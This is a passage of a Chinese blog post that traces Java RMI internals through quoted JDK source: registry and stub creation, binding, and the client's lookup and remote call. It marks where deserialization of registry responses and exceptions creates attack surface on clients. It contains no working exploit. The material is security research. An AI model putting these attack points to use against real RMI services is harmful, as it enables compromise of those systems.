     <span class="keyword">return</span> sref.exportObject(obj, <span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>boolean permanent</code>为第三个参数，意为永久性，所以说我们现在创建的注册中心是一个永久性的对象，而之前说的远程服务是一个临时性的对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote impl, Object data,</span></span><br><span class="line"><span class="params">                               <span class="type">boolean</span> permanent)</span></span><br></pre></td></tr></table></figure>

<p>接下来我们应该可以回顾起来之前的知识</p>
<p>下面我把有区别的地方拿出来,再最后调用的<code>stubClassExists</code>中的if判断时候，最终会找到<code>RegistryImpl_Stub</code>类，所以会走到try中的函数并返回true</p>
<p>在<code>createProxy</code>的if判断中返回true后，会走到if中，执行<code>createStub</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// UnicastServerRef#exportObject</span></span><br><span class="line"><span class="keyword">public</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote impl, Object data,</span></span><br><span class="line"><span class="params">                               <span class="type">boolean</span> permanent)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">    ...</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            stub = Util.createProxy(implClass, getClientRef(), forceStubUse);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(</span><br><span class="line">                <span class="string">&quot;remote object implements illegal remote interface&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Util#createProxy</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">createProxy</span><span class="params">(Class&lt;?&gt; implClass,</span></span><br><span class="line"><span class="params">                                     RemoteRef clientRef,</span></span><br><span class="line"><span class="params">                                     <span class="type">boolean</span> forceStubUse)</span></span><br><span class="line">        <span class="keyword">throws</span> StubNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">    ...</span><br><span class="line">        <span class="keyword">if</span> (forceStubUse ||</span><br><span class="line">            !(ignoreStubClasses || !stubClassExists(remoteClass)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> createStub(remoteClass, clientRef);</span><br><span class="line">        &#125;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Util#stubClassExists</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">stubClassExists</span><span class="params">(Class&lt;?&gt; remoteClass)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!withoutStubs.containsKey(remoteClass)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class.forName(remoteClass.getName() + <span class="string">&quot;_Stub&quot;</span>,</span><br><span class="line">                              <span class="literal">false</span>,</span><br><span class="line">                              remoteClass.getClassLoader());</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException cnfe) &#123;</span><br><span class="line">                withoutStubs.put(remoteClass, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>createStub函数中也非常简单，将我们所找到的类先初始化，再实例化出来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> RemoteStub <span class="title function_">createStub</span><span class="params">(Class&lt;?&gt; remoteClass, RemoteRef ref)</span></span><br><span class="line">        <span class="keyword">throws</span> StubNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">stubname</span> <span class="operator">=</span> remoteClass.getName() + <span class="string">&quot;_Stub&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Make sure to use the local stub loader for the stub classes.</span></span><br><span class="line"><span class="comment">         * When loaded by the local loader the load path can be</span></span><br><span class="line"><span class="comment">         * propagated to remote clients, by the MarshalOutputStream/InStream</span></span><br><span class="line"><span class="comment">         * pickle methods</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; stubcl =</span><br><span class="line">                Class.forName(stubname, <span class="literal">false</span>, remoteClass.getClassLoader());</span><br><span class="line">            Constructor&lt;?&gt; cons = stubcl.getConstructor(stubConsParamTypes);</span><br><span class="line">            <span class="keyword">return</span> (RemoteStub) cons.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; ref &#125;);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(</span><br><span class="line">                <span class="string">&quot;Stub class not found: &quot;</span> + stubname, e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(</span><br><span class="line">                <span class="string">&quot;Stub class missing constructor: &quot;</span> + stubname, e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(</span><br><span class="line">                <span class="string">&quot;Can&#x27;t create instance of stub class: &quot;</span> + stubname, e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(</span><br><span class="line">                <span class="string">&quot;Stub class constructor not public: &quot;</span> + stubname, e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(</span><br><span class="line">                <span class="string">&quot;Exception creating instance of stub class: &quot;</span> + stubname, e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassCastException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(</span><br><span class="line">                <span class="string">&quot;Stub class not instance of RemoteStub: &quot;</span> + stubname, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>创建完成之后的Stub是一个<code>RegistryImpl_Stub</code>，其中封装着<code>UnicastRef</code>，<code>UnicastRef</code>封装着LiveR&#96;&#96;ef</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735573834459-17635906-08a3-40a4-b049-fd4806e3742b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735573834459-17635906-08a3-40a4-b049-fd4806e3742b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>由于我们的Stub是<code>RegistryImpl_Stub</code>，是JDK中自带的Stub，而它是继承于RemoteStub的，所以会进入到if当中，执行setSkeleton方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">RegistryImpl_Stub</span> <span class="keyword">extends</span> <span class="title class_">RemoteStub</span> <span class="keyword">implements</span> <span class="title class_">Registry</span>, Remote </span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (stub <span class="keyword">instanceof</span> RemoteStub) &#123;</span><br><span class="line">            setSkeleton(impl);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p><code>setSkeleton</code>方法中，会创建一个<code>Sekleton</code>，服务端和客户端都会有代理来处理网络请求，客户端代理为<code>Stub</code>，而服务端代理则为<code>Sekleton</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSkeleton</span><span class="params">(Remote impl)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!withoutSkeletons.containsKey(impl.getClass())) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                skel = Util.createSkeleton(impl);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SkeletonNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * Ignore exception for skeleton class not found, because a</span></span><br><span class="line"><span class="comment">                 * skeleton class is not necessary with the 1.2 stub protocol.</span></span><br><span class="line"><span class="comment">                 * Remember that this impl&#x27;s class does not have a skeleton</span></span><br><span class="line"><span class="comment">                 * class so we don&#x27;t waste time searching for it again.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                withoutSkeletons.put(impl.getClass(), <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>最后也是直接通过	远程类的名字+ “_Skel”	初始化并且实例化这个类并返回</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> Skeleton <span class="title function_">createSkeleton</span><span class="params">(Remote object)</span></span><br><span class="line">        <span class="keyword">throws</span> SkeletonNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        Class&lt;?&gt; cl;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            cl = getRemoteClass(object.getClass());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonNotFoundException</span>(</span><br><span class="line">                <span class="string">&quot;object does not implement a remote interface: &quot;</span> +</span><br><span class="line">                object.getClass().getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// now try to load the skeleton based ont he name of the class</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">skelname</span> <span class="operator">=</span> cl.getName() + <span class="string">&quot;_Skel&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; skelcl = Class.forName(skelname, <span class="literal">false</span>, cl.getClassLoader());</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (Skeleton)skelcl.newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonNotFoundException</span>(<span class="string">&quot;Skeleton class not found: &quot;</span> +</span><br><span class="line">                                                skelname, ex);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonNotFoundException</span>(<span class="string">&quot;Can&#x27;t create skeleton: &quot;</span> +</span><br><span class="line">                                                skelname, ex);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonNotFoundException</span>(<span class="string">&quot;No public constructor: &quot;</span> +</span><br><span class="line">                                                skelname, ex);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassCastException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonNotFoundException</span>(</span><br><span class="line">                <span class="string">&quot;Skeleton not of correct class: &quot;</span> + skelname, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>最后也是，创建一个<code>Target</code>，去吧有用的东西都存入进去，并把我们封装的东西发布出去（使用exportObject函数）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Target</span>(impl, <span class="built_in">this</span>, stub, ref.getObjID(), permanent);</span><br><span class="line">ref.exportObject(target);</span><br></pre></td></tr></table></figure>

<p>最后在<code>TCPTransport</code>中的<code>exportObject</code>方法中调用其父类的<code>exportObject</code>，使用<code>putTarget</code>方法，将所封装的<code>Target</code>放入静态表中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TCPTransport#exportObject</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target target)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.exportObject(target);</span><br><span class="line">            ok = <span class="literal">true</span>;</span><br><span class="line">        &#125; ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Transport#exportObject</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target target)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        target.setExportedTransport(<span class="built_in">this</span>);</span><br><span class="line">        ObjectTable.putTarget(target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ObjectTable#putTarget</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">putTarget</span><span class="params">(Target target)</span> <span class="keyword">throws</span> ExportException &#123;</span><br><span class="line">        ...</span><br><span class="line">                objTable.put(oe, target);</span><br><span class="line">                implTable.put(weakImpl, target);</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在静态表中，一共有三个Stub，其中一个是<code>DGCImpl_Stub</code>（分布式垃圾回收，默认创建），可以在表中点着看看，实际上其实和远程服务是一个东西</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735576170364-92848339-1eb4-43ce-898f-acf8476f2b15.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735576170364-92848339-1eb4-43ce-898f-acf8476f2b15.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这就是创建注册中心的流程</p>
<h4 id="ce9N3">绑定</h4>
相比于其他的，这个绑定流程就非常简单了

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">r.bind(<span class="string">&quot;remoteObj&quot;</span>,remoteObj);</span><br></pre></td></tr></table></figure>

<p>进入到bind方法中</p>
<p>其中checkAccess方法是检查是否在本地绑定</p>
<p>bindings是一个静态表，bindings.get是从静态表中寻找name的，如果说表中存在该name的绑定，则会抛出一个AlreadyBoundException的异常，如果没有的话，就会将（name，远程对象）put进去。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bind</span><span class="params">(String name, Remote obj)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException, AlreadyBoundException, AccessException</span><br><span class="line">    &#123;</span><br><span class="line">        checkAccess(<span class="string">&quot;Registry.bind&quot;</span>);</span><br><span class="line">        <span class="keyword">synchronized</span> (bindings) &#123;</span><br><span class="line">            <span class="type">Remote</span> <span class="variable">curr</span> <span class="operator">=</span> bindings.get(name);</span><br><span class="line">            <span class="keyword">if</span> (curr != <span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AlreadyBoundException</span>(name);</span><br><span class="line">            bindings.put(name, obj);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p><strong>tips:在RMI的实现上，要求注册中心和服务端在同一台主机上，低版本时实现上允许远程绑定，导致一些漏洞</strong></p>
<h4 id="yaynX">客户端请求注册中心-客户端</h4>
客户端会做两件事情，第一个就是向注册中心去拿远程对象的代理，第二个对服务端进行一个调用

<p>有人会觉得，我获取一个远程对象，肯定要有序列化和反序列化，但实际却不太一样</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br></pre></td></tr></table></figure>

<p>实际，我们将ip和端口传入，他首先是封装了一个<code>LiveRef</code>，然后调用<code>Util.createProxy</code>方法</p>
<p>和我们之前看到的创建流程好像一样，其实是在本地创建了一个，我们就有了注册中心的stub对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// LocateRegistry#getRegistry</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title function_">getRegistry</span><span class="params">(String host, <span class="type">int</span> port)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> getRegistry(host, port, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// LocateRegistry#getRegistry</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title function_">getRegistry</span><span class="params">(String host, <span class="type">int</span> port,</span></span><br><span class="line"><span class="params">                                       RMIClientSocketFactory csf)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (port &lt;= <span class="number">0</span>)</span><br><span class="line">            port = Registry.REGISTRY_PORT;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (host == <span class="literal">null</span> || host.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// If host is blank (as returned by &quot;file:&quot; URL in 1.0.2 used in</span></span><br><span class="line">            <span class="comment">// java.rmi.Naming), try to convert to real local host name so</span></span><br><span class="line">            <span class="comment">// that the RegistryImpl&#x27;s checkAccess will not fail.</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                host = java.net.InetAddress.getLocalHost().getHostAddress();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="comment">// If that failed, at least try &quot;&quot; (localhost) anyway...</span></span><br><span class="line">                host = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="type">LiveRef</span> <span class="variable">liveRef</span> <span class="operator">=</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">LiveRef</span>(<span class="keyword">new</span> <span class="title class_">ObjID</span>(ObjID.REGISTRY_ID),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port, csf, <span class="literal">null</span>),</span><br><span class="line">                        <span class="literal">false</span>);</span><br><span class="line">        <span class="type">RemoteRef</span> <span class="variable">ref</span> <span class="operator">=</span></span><br><span class="line">            (csf == <span class="literal">null</span>) ? <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(liveRef) : <span class="keyword">new</span> <span class="title class_">UnicastRef2</span>(liveRef);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (Registry) Util.createProxy(RegistryImpl.class, ref, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>下一步就是去查找远程对象，客户端将名字给过去，获取到一个远程对象的代理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>我们进入lookup方法看一下，首先它将我们传入的那个名字（字符串），写入了一个输出流，就是序列化进去了，后续肯定还有一个反序列化的点</p>
<p>后面还有一个读输入流的地方，将输入流读出来的进行反序列化，赋值到var23上，我们可以知道，这个var23就是我们从注册中心获取回来的stub</p>
<p>其中对<strong>从注册中心读到的输入流</strong>进行<strong>反序列化</strong>的这个地方，可能就存在攻击点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> AccessException, NotBoundException, RemoteException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">                var3.writeObject(var1);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var18) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var18);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">super</span>.ref.invoke(var2);</span><br><span class="line"></span><br><span class="line">            Remote var23;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectInput</span> <span class="variable">var6</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                var23 = (Remote)var6.readObject();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var15) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var15);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException var16) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var16);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.ref.done(var2);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> var23;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException var19) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var19;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var20) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var20;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException var21) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var21;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var22) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnexpectedException</span>(<span class="string">&quot;undeclared checked exception&quot;</span>, var22);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>super.ref.invoke(var2);</code>调用了<code>UnicastRef</code>的<code>invoke</code>方法，它调用了<code>executeCall</code>方法，这个方法是用来处理网络请求的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(RemoteCall call)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clientRefLog.log(Log.VERBOSE, <span class="string">&quot;execute call&quot;</span>);</span><br><span class="line"></span><br><span class="line">            call.executeCall();</span><br><span class="line"></span><br><span class="line">        &#125; ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里还存在一个攻击点，就在<code>StreamRemoteCall</code>的<code>executeCall</code>方法中</p>
<p>如果返回异常，且异常为<code>TransportConstants.ExceptionalReturn</code>，就会将这个异常反序列化出来，如果说注册中心返回一个恶意的流，就会导致客户端被攻击</p>
<p>这里的攻击面是非常广的，只要调用了<code>StreamRemoteCall#executeCall</code>或者说<code>UnicastRef#invoke</code>，就会有攻击面</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">executeCall</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        <span class="comment">// read return value</span></span><br><span class="line">        <span class="keyword">switch</span> (returnType) &#123;</span><br><span class="line">        <span class="keyword">case</span> TransportConstants.NormalReturn:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> TransportConstants.ExceptionalReturn:</span><br><span class="line">            Object ex;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ex = in.readObject();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Error unmarshaling return&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// An exception should have been received,</span></span><br><span class="line">            <span class="comment">// if so throw it, else flag error</span></span><br><span class="line">            <span class="keyword">if</span> (ex <span class="keyword">instanceof</span> Exception) &#123;</span><br><span class="line">                exceptionReceivedFromServer((Exception) ex);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Return type not Exception&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Exception is thrown before fallthrough can occur</span></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">if</span> (Transport.transportLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                Transport.transportLog.log(Log.BRIEF,</span><br><span class="line">                    <span class="string">&quot;return code invalid: &quot;</span> + returnType);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Return code invalid&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="fJ2jX">客户端请求服务端-客户端</h4>
我们来看一下客户端请求服务端，客户端是怎么做的

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(remoteObj.sayHello(<span class="string">&quot;SheepSean&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>第一步，我们会走到一个非预期的地方，因为remoteObj是一个动态远程代理，调用它的任何方法，都会跳到<code>invoke</code>方法中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span><br><span class="line">        <span class="keyword">throws</span> Throwable</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (! Proxy.isProxyClass(proxy.getClass())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;not a proxy&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Proxy.getInvocationHandler(proxy) != <span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;handler mismatch&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (method.getDeclaringClass() == Object.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> invokeObjectMethod(proxy, method, args);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;finalize&quot;</span>.equals(method.getName()) &amp;&amp; method.getParameterCount() == <span class="number">0</span> &amp;&amp;</span><br><span class="line">            !allowFinalizeInvocation) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// ignore</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> invokeRemoteMethod(proxy, method, args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>最后它走到了<code>invokeRemoteMethod</code>中，在其中，我们要看一下<code>ref.invoke</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">invokeRemoteMethod</span><span class="params">(Object proxy,</span></span><br><span class="line"><span class="params">                                     Method method,</span></span><br><span class="line"><span class="params">                                     Object[] args)</span></span><br><span class="line">       <span class="keyword">throws</span> Exception</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (!(proxy <span class="keyword">instanceof</span> Remote)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(</span><br><span class="line">                   <span class="string">&quot;proxy not Remote instance&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">return</span> ref.invoke((Remote) proxy, method, args,</span><br><span class="line">                             